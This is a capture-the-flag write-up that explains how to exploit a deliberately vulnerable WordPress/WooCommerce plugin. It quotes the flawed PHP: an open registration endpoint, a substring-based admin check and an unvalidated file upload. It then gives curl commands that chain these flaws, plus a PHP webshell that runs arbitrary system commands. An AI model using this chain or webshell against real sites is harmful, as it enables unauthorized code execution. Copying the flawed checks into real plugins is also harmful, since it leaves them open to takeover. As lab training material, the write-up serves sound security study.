# My-Shop-Disaster

*Author: Patchstack*

I just installed wordpress to sell my stuff with Woocommerce. I found it a bit boring so I installed that other plugin to pimp it, I don't think it could cause a security issue?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Challenge may take anywhere between 1-3 minutes to fully start up.

NOTE, the challenge has a non-standard flag format. You will find a `CTF{}` wrapper around standard_text.

Press the `Start` button on the top-right to begin this challenge.

### Attachments

- `attachment.zip`
    - *Contains source and development setup scripts*
- `challenge_details.txt`
```
===========
ENVIRONMENT
===========
Latest WordPress installation
Plugins: WooCommerce (source code available online), Woo Variations (source code available in woo-variations folder)

===========
DESCRIPTION
===========
I just installed wordpress to sell my stuff with Woocommerce. I found it a bit boring so I installed that other plugin to pimp it, I don't think it could cause a security issue?

NOTE: this is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).
```

### Analyze

- Scanning source code from `attachment.zip` the bulk of the custom plugin code is located at `challenge-custom/woo-variations/includes/`
- Specifically looking into the `class-woo-variations*.php` files, and focusing mostly on `rest-api.php` and `backend.php`
- Discover public rest api endpoint to enable user registration: `/woo-variations/v1/registration-enable/`
    ```php
    // File: class-woo-variations-rest-api.php
    // ...
    // Line 32
    add_action( 'rest_api_init', array( $this, 'register_customer_registration_enable' ) );
    // ...
    // Line 91
    function register_customer_registration_enable() {
        register_rest_route( 'woo-variations/v1', '/registration-enable/', array(
            'methods'  => 'GET',
            'callback' => array($this, 'registration_enable'),
            'args'     => array(
                'data' => array(
                'required' => false,
                'default'  => array(),
                )
            )
        ));
    }
    // Line 104
    function registration_enable( $data ) {
        update_option( 'users_can_register', 1 );
        wp_send_json('Customer registration enabled');
    }
    ```
- Now we can visit `wp-admin` directly to register a new user:
    - http://challenge.nahamcon.com:1234/wp-admin
- Logged in as regular user, we can see account page and some basic navigation options:
    - Dashboard
        - *Not much here, links to other pages*
    - Orders
        - *Empty list, link to products (also empty)*
    - Downloads
        - *Empty list, link to products (also empty)*
    - Addresses
        - *Forms to edit billing/shipping address details*
    - Account details
        - *Account details form*
    - Log out
- Not much here, looking into address & account forms doesn't show anything helpful or useful.
- So we can register new users after enabling from api, what else can we do with regular user accounts?
    - *Dig into more custom plugin source code!*
- The function that stood out as possibly vulnerable was `set_gallery_picture` in the `backend.php` file:
    - *Added comments with `NOTE:` prefix*
    ```php
    // File: class-woo-variations-backend.php
    // ...
    // Line 133
    public function set_gallery_picture() {
        // NOTE: Custom auth perms check method could be broken "check_permission()"
        if ( !is_admin() || !$this->check_permission() )
        {
            wp_send_json( 'Unauthorized!' );
        }
        
        // NOTE: The verification for $product_id is just as general variable/integer (no DB lookup)
        $product_id = isset( $_POST['product_id'] ) ? intval( $_POST['product_id'] ) : 0;

        // Verify that the product exists and is a WooCommerce product
        if ( $product_id && function_exists( 'wc_get_product' ) ) {
            if ( $_FILES && isset( $_FILES['gallery_picture'] ) ) {
                
                $file = $_FILES['gallery_picture'];
                // NOTE: This check function returns filetype, but doesn't force matches or "die" on error
                $file_type = wp_check_filetype( basename( $file['name'] ), array( 'jpg', 'jpeg', 'png' ) );
                // NOTE: !! MISSING CHECK TO VALIDATE $file_type HERE !!
                $upload_dir = wp_upload_dir();
                $upload_path = $upload_dir['basedir'] . '/woo-gallery/';
                if ( !file_exists( $upload_path ) ) {
                    wp_mkdir_p( $upload_path );
                }

                // NOTE: Here file upload has actually happened and moved to uploads folder
                if (move_uploaded_file( $file['tmp_name'], $upload_path . sanitize_file_name($file['name']) ) ) {
 
    // Other stuff ...

    // Line 257
    function check_permission() {
        // NOTE: Regular users are allowed "manage_options"
        // NOTE: The strpos() function returns position of substr (int) or false if not found (BUT NOT EXACT MATCH)
        if ( !current_user_can( "manage_options" ) && strpos( wp_get_current_user()->user_login, 'admin' ) === false )
        {
            return false;
        }
        
        return true;
    }
    ```

### Exploit

- So now we have uncovered an exploit path that looks like:
    1. Enable user registration
        - The registered endpoint is for `GET` http method, so easy to trigger with simple curl request:
        ```bash
        URL=http://challenge.nahamcon.com:1234
        curl $URL/wp-json/woo-variations/v1/registration-enable/
        # "Customer registration enabled"
        ```
    2. Signup as new user (*can bypass custom admin check*)
        - Visit `/wp-admin` and register new user with `admin` somewhere in the name
            - *Example username: `notadminlol`*
        - Login with new fake admin user
        - Extract auth cookies (`wordpress_*`, etc)
    3. Abuse the set_gallery_picture upload logic
        - Upload exploit to vulnerable ajax endpoint (with user cookie)
        ```php
        // File: flag.php (minimal exploit to show flag)
        <?= file_get_contents('/flag.txt') ?>
        ```
        - With `$cookie` from user, trigger exploit for `flag.php`
        ```bash
        url=${1:-"http://challenge.nahamcon.com:1234"}
        cookie="..."
        curl -vL -F "action=set_gallery_picture" -F "product_id=1" -F "gallery_picture=@flag.php;type=image/png" -H "Cookie: $cookie" $url/wp-admin/admin-ajax.php
        ```
    4. Get the flag!
        - Visit route: `/wp-content/uploads/woo-gallery/flag.php`
    4. Bonus: a webshell!
        - Use webshell payload
        ```php
        // File: shell.php
        <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
        ```
        - With `$cookie` from user, trigger exploit for `shell.php`
        ```bash
        url=${1:-"http://challenge.nahamcon.com:1234"}
        cookie="..."
        curl -vL -F "action=set_gallery_picture" -F "product_id=1" -F "gallery_picture=@shell.php;type=image/png" -H "Cookie: $cookie" $url/wp-admin/admin-ajax.php
        ```